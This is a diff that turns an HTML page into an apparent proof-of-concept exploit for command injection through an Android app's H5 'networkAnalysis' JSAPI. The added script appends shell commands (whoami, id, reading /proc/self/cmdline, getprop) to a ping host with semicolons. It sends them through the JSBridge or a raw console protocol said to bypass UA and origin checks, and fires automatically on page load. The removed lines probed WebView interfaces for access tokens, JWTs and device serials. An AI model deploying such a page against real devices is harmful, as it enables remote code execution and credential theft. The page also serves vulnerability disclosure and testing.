@@ -1,190 +1,118 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TEST</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>H5 JSAPI -> RCE PoC (whoami)</title>
 <style>
-body {
-font-family: Arial, sans-serif;
-margin: 20px;
-}
-.info {
-margin-bottom: 20px;
-}
-button {
-padding: 10px 20px;
-font-size: 16px;
-cursor: pointer;
-margin-right: 10px;
-}
+body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px;line-height:1.5}
+h2{color:#ff0;font-size:15px;margin:6px 0}
+button{font-size:14px;padding:10px 12px;margin:3px 3px 3px 0;border:0;border-radius:6px;background:#0a0;color:#000;font-weight:bold}
+button.b{background:#08f;color:#fff}
+button.c{background:#f80;color:#000}
+#log{white-space:pre-wrap;word-break:break-all;background:#000;border:1px solid #333;padding:8px;min-height:180px}
+#env{color:#8cf;margin:6px 0;word-break:break-all}
+small{color:#aaa;display:block;margin-top:8px}
 </style>
 </head>
 <body>
+<h2>H5 JSAPI -> 命令注入 PoC (networkAnalysis / PingUtil.java:63)</h2>
+<div id="env"></div>
+<p>
+  <button onclick="probe()">1 探测桥</button>
+  <button class="b" onclick="fire()">2 执行 whoami 并落盘</button>
+  <button class="c" onclick="fire('id')">3 变体 id</button>
+  <button class="c" onclick="fire('uname -a')">4 变体 uname</button>
+  <button class="c" onclick="fireMulti()">5 多通道重发</button>
+</p>
+<div id="log">init...</div>
+<small>
+验证（测试机已 root）：<br>
+adb shell su -c 'cat /data/data/com.hihonor.videoeditor/files/poc_whoami.txt'   &lt;- 应用沙箱文件<br>
+adb shell cat /sdcard/Android/data/com.hihonor.videoeditor/files/poc_whoami.txt  &lt;- 应用外部沙箱副本<br>
+adb logcat -s PingUtil H5WebChromeClient H5NativeMessager | grep -iE "networkAnalysis|ping\(\) host"<br>
+注意：whoami 输出的是应用 uid（u0_aXXX），不会是 root；文件存在即证明命令注入成功。
+</small>
+
 <script>
+var OUT_INT = "/data/data/com.hihonor.videoeditor/files/poc_whoami.txt";
+var OUT_EXT = "/sdcard/Android/data/com.hihonor.videoeditor/files/poc_whoami.txt";
+var OUT_DL  = "/sdcard/Download/poc_whoami.txt";
 
-// try {
-//   alert("getAccessToken: " + AnalyticsWebInterface.login());
-// } catch (e) {
-//   alert("getAccessToken error: " + e.message);
-// }
-  
-// try {
-//   alert("getAccessToken: " + AnalyticsWebInterface.getAccessToken());
-// } catch (e) {
-//   alert("getAccessToken error: " + e.message);
-// }
+function el(id){ return document.getElementById(id); }
 
-// try {
-//   alert("getAccessTokenFromCache: " + AnalyticsWebInterface.getAccessTokenFromCache());
-// } catch (e) {
-//   alert("getAccessTokenFromCache error: " + e.message);
-// }
-
-// try {
-//   alert("getAT: " + AnalyticsWebInterface.getAT(0));
-// } catch (e) {
-//   alert("getAT error: " + e.message);
-// }
-
-// try {
-//   alert("getATSecurity: " + AnalyticsWebInterface.getATSecurity());
-// } catch (e) {
-//   alert("getATSecurity error: " + e.message);
-// }
-
-// try {
-//   alert("getAccessTokenFromCacheSecurity: " + AnalyticsWebInterface.getAccessTokenFromCacheSecurity());
-// } catch (e) {
-//   alert("getAccessTokenFromCacheSecurity error: " + e.message);
-// }
-
-// try {
-//   alert("CSRFToken: " + AnalyticsWebInterface.CSRFToken);
-// } catch (e) {
-//   alert("CSRFToken error: " + e.message);
-// }
-
-// try {
-//   alert("CSRFTokenSecurity: " + AnalyticsWebInterface.CSRFTokenSecurity);
-// } catch (e) {
-//   alert("CSRFTokenSecurity error: " + e.message);
-// }
-
-// try {
-//   alert("getJWT: " + AnalyticsWebInterface.getJWT());
-// } catch (e) {
-//   alert("getJWT error: " + e.message);
-// }
-
-// try {
-//   alert("getJWTSecurity: " + AnalyticsWebInterface.getJWTSecurity());
-// } catch (e) {
-//   alert("getJWTSecurity error: " + e.message);
-// }
-
-// try {
-//   alert("getJwtToken: " + AnalyticsWebInterface.getJwtToken());
-// } catch (e) {
-//   alert("getJwtToken error: " + e.message);
-// }
-
-//   try {
-//   alert("getJwtToken: " + AnalyticsWebInterface.getBindDeviceSN());
-// } catch (e) {
-//   alert("getJwtToken error: " + e.message);
-// }
-
-  
-
-//     try {
-//   alert("getAT 0: " + MHJsInterface.getAT("0"));
-// } catch (e) {
-//   alert("getAT 0:  error: " + e.message);
-// }
-
-//       try {
-//   alert("getAT 1: " + MHJsInterface.getAT("1"));
-// } catch (e) {
-//   alert("getAT 1:  error: " + e.message);
-// }
-
-//       try {
-//   alert("getAT 2: " + MHJsInterface.getAT("2"));
-// } catch (e) {
-//   alert("getAT 2:  error: " + e.message);
-// }
-
-//         try {
-//   alert("getAT 3: " + MHJsInterface.getAT("3"));
-// } catch (e) {
-//   alert("getAT 3:  error: " + e.message);
-// }
-
-//   try {
-//   alert("getAccessTokenFromCache: " + MHJsInterface.getAccessTokenFromCache());
-// } catch (e) {
-//   alert("getAccessTokenFromCache error: " + e.message);
-// }
-
-  
-
-//     try {
-//   alert("getCSRFToken() " + MHJsInterface.getCSRFToken());
-// } catch (e) {
-//   alert("getCSRFToken() error: " + e.message);
-// }
-
-
-//     try {
-//   alert("getDeviceSN() " + MHJsInterface.getDeviceSN());
-// } catch (e) {
-//   alert("getDeviceSN() error: " + e.message);
-// }
-
-  
-//       try {
-//   alert("getJWT() " + MHJsInterface.getJWT());
-// } catch (e) {
-//   alert("getJWT() error: " + e.message);
-// }
-
-        try {
-  alert("  getTrinityJwt() " + MHJsInterface.getTrinityJwt());
-} catch (e) {
-  alert("  getTrinityJwt() error: " + e.message);
+function log(s){
+  var t = new Date().toTimeString().substr(0,8);
+  el("log").textContent += "[" + t + "] " + s + "\n";
+  try { var w = window.JSBridgeConsole || window.console; w.log("[PoC] " + s); } catch(e){}
 }
 
+function hasBridge(){ return !!(window.JSBridge && typeof window.JSBridge.call === "function"); }
 
-
-          try {
-  alert("  goDownloadAppFromMarket " + MHJsInterface.goDownloadAppFromMarket("com.tencent.tmgp.sgame"));
-} catch (e) {
-  alert("  goDownloadAppFromMarket error: " + e.message);
+/* 容器协议：native 侧(H5WebChromeClient)只认 console 消息前缀，不校验 UA / 来源域名 */
+function rawSend(obj, level){
+  var msg = JSON.stringify(obj);
+  var w = window.JSBridgeConsole || window.console;
+  var fn = (w && typeof w[level || "log"] === "function") ? w[level || "log"] : w.log;
+  fn.call(w, "h5container.message: " + msg);
+  log((level || "log") + " -> " + msg);
 }
 
-  
-
-            try {
-  alert("  isApkInstall com.tencent.tmgp.sgame" + MHJsInterface.isApkInstall("com.tencent.tmgp.sgame"));
-} catch (e) {
-  alert("  isApkInstall com.tencent.tmgp.sgame error: " + e.message);
+/* 构造注入串：先给 ping 一个合法目标，再用分号追加命令，# 注释掉尾部 */
+function buildHost(extra){
+  var cmds = [];
+  cmds.push("whoami > " + OUT_INT + " 2>&1");
+  cmds.push("id >> " + OUT_INT + " 2>&1");
+  cmds.push("echo '--- proc ---' >> " + OUT_INT);
+  cmds.push("cat /proc/self/cmdline >> " + OUT_INT + " 2>&1");
+  cmds.push("echo '' >> " + OUT_INT);
+  if (extra) cmds.push(extra + " >> " + OUT_INT + " 2>&1");
+  cmds.push("echo EXEC_OK >> " + OUT_INT);
+  cmds.push("cat " + OUT_INT + " > " + OUT_EXT + " 2>/dev/null");
+  cmds.push("cat " + OUT_INT + " > " + OUT_DL + " 2>/dev/null");
+  return "127.0.0.1;" + cmds.join(";") + ";#";
 }
 
-              try {
-  alert("  isApkInstall com.huawei.phoneservice" + MHJsInterface.isApkInstall("com.huawei.phoneservice"));
-} catch (e) {
-  alert("  isApkInstall com.huawei.phoneservice error: " + e.message);
+function probe(){
+  log("href = " + location.href);
+  log("UA   = " + navigator.userAgent);
+  log("typeof window.JSBridge = " + (typeof window.JSBridge) + " , JSBridgeConsole = " + (typeof window.JSBridgeConsole));
+  if (hasBridge()) {
+    window.JSBridge.call("checkJSAPI", {jsApiList:["networkAnalysis","deviceInfo","getClipboard","selectMedia"]}, function(r){ log("checkJSAPI <- " + JSON.stringify(r)); });
+    window.JSBridge.call("deviceInfo", {}, function(r){ log("deviceInfo <- " + String(JSON.stringify(r)).substr(0,300)); });
+  } else {
+    rawSend({clientId:"probe"+Date.now(), func:"deviceInfo", msgType:"call", keepCallback:false, param:{}}, "probe");
+  }
 }
 
-  
-
-            try {
-  alert("getScanSN " + MHJsInterface.getScanSN("arg1", "arg2"));
-} catch (e) {
-  alert("getScanSN error: " + e.message);
+function fire(extra){
+  var host = buildHost(extra);
+  log("host = " + host);
+  if (hasBridge()) {
+    window.JSBridge.call("networkAnalysis", {host: host}, function(r){ log("networkAnalysis <- " + JSON.stringify(r)); });
+    log("派发方式: window.JSBridge.call");
+  } else {
+    rawSend({clientId:"poc"+Date.now(), func:"networkAnalysis", msgType:"call", keepCallback:false, param:{host: host}}, "log");
+    log("派发方式: 原始 console 协议 (绕过 UA 门禁)");
+  }
+  log("等待 1~2 秒后检查文件 / logcat");
 }
 
+function fireMulti(){
+  var host = buildHost("getprop ro.build.version.release");
+  var levels = ["log","info","warn","error"];
+  for (var i=0;i<levels.length;i++){
+    rawSend({clientId:"poc"+i+Date.now(), func:"networkAnalysis", msgType:"call", keepCallback:false, param:{host: host}}, levels[i]);
+  }
+  log("已用 4 个 console 级别重发");
+}
+
+(function boot(){
+  el("env").textContent = "url=" + location.href + "  |  JSBridge=" + (typeof window.JSBridge);
+  log("PoC booted, 自动探测并触发...");
+  setTimeout(probe, 400);
+  setTimeout(function(){ fire(); }, 1200);
+})();
 </script>
 </body>
 </html>
